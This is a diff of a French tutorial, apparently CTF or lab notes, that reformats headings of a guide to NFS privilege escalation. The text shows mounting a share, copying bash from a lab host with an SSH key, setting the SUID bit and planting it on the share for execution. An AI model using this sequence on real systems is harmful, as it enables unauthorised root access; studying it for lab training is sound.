@@ -6,7 +6,7 @@ NFS (Network File System) est un protocole utilisé pour partager des fichiers e
 
 ***
 
-**1. Découvrir les Partages NFS Disponibles**
+### **1. Découvrir les Partages NFS Disponibles**
 
 Pour lister les partages disponibles sur une machine distante :
 
@@ -19,7 +19,7 @@ Pour lister les partages disponibles sur une machine distante :
 
 ***
 
-**2. Créer un Point de Montage**
+### **2. Créer un Point de Montage**
 
 Avant de monter un partage NFS, créez un répertoire local qui servira de point de montage :
 
@@ -32,7 +32,7 @@ Ce répertoire sera utilisé pour accéder au contenu partagé par le serveur NF
 
 ***
 
-**3. Monter un Partage NFS**
+### **3. Monter un Partage NFS**
 
 Pour connecter un partage NFS à votre point de montage :
 
@@ -49,7 +49,7 @@ sudo mount -t nfs [IP machine distante]:[répertoire partagé] /tmp/mount -noloc
 
 ***
 
-**4. Transférer des Fichiers via SCP**
+### **4. Transférer des Fichiers via SCP**
 
 Pour récupérer un fichier (comme un exécutable `bash`) depuis une machine distante :
 
@@ -72,7 +72,7 @@ scp -i id_rsa cappucino@10.10.72.89:/bin/bash ~/Downloads/bash
 
 ***
 
-**5. Modifier les Droits sur le Fichier**
+### **5. Modifier les Droits sur le Fichier**
 
 Pour définir le bit `suid` sur un fichier (ce qui permet d'exécuter le fichier avec les privilèges de son propriétaire) :
 
@@ -86,7 +86,7 @@ chmod +s bash
 
 ***
 
-**6. Déplacer le Fichier sur le Partage NFS**
+### **6. Déplacer le Fichier sur le Partage NFS**
 
 Déplacez le fichier modifié vers le partage monté :
 
@@ -96,7 +96,7 @@ mv ~/Downloads/bash /tmp/mount/[utilisateur]
 
 ***
 
-**7. Exécuter le Fichier sur la Machine Cible**
+### **7. Exécuter le Fichier sur la Machine Cible**
 
 Reconnectez-vous à la machine distante en SSH et exécutez le fichier transféré :
 
